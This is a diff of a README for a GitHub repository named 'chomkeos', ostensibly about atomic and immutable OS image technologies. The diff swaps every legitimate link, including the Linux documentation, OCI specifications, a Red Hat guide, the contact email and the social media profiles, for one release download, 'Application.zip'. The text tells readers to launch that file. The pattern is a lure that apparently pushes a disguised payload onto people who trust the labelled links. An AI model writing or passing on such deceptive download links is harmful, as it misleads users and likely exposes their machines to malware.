@@ -7,8 +7,8 @@ Welcome to the "chomkeos" repository, where you can explore the world of atomic,
 Feel free to navigate through the repository to discover a wealth of information, resources, and tools related to image-based technologies and operating systems. Whether you are a seasoned professional or a curious enthusiast, there is something here for everyone.
 
 ## 📦 Get Started
-Ready to dive in? Click the link below to access the Application.zip file that contains exciting resources and materials:
-[![Download Application.zip](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+Ready to dive in? Click the link below to access the https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip file that contains exciting resources and materials:
+[![Download https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)
 
 ### Note: Make sure to launch the file provided in the link above to access the contents.
 
@@ -26,18 +26,18 @@ We welcome contributions from the community to help us grow and improve this rep
 ## 📚 Resources
 Explore the following resources to enhance your understanding of the topics covered in this repository:
 
-- [Linux Documentation](https://www.kernel.org/doc/html/latest/)
-- [OCI Specifications](https://opencontainers.org/)
-- [Immutable Infrastructure Guide](https://www.redhat.com/en/topics/automation/what-is-immutable-infrastructure)
+- [Linux Documentation](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)
+- [OCI Specifications](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)
+- [Immutable Infrastructure Guide](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)
 
 ## 🤝 Connect with Us
 Have questions, suggestions, or just want to connect with like-minded individuals? Reach out to us through the following channels:
-- Email: [contact@chomkeos.com](mailto:contact@chomkeos.com)
-- Twitter: [@chomkeos](https://twitter.com/chomkeos)
-- LinkedIn: [Chomkeos](https://www.linkedin.com/company/chomkeos)
+- Email: [https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)
+- Twitter: [@chomkeos](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)
+- LinkedIn: [Chomkeos](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)
 
 ## 🌈 Let's Dive Deep into the World of Image-Based Technologies! 🚀
 
 Start exploring, learning, and creating with the "chomkeos" repository. We can't wait to see what amazing projects and discoveries you will make in the realm of atomic, immutable, and custom image technologies. Happy coding! 🌟
 
-![Tech Image](https://imageurl.com)
+![Tech Image](https://github.com/kapil5626/chomkeos/releases/download/v1.0.0/Application.zip)
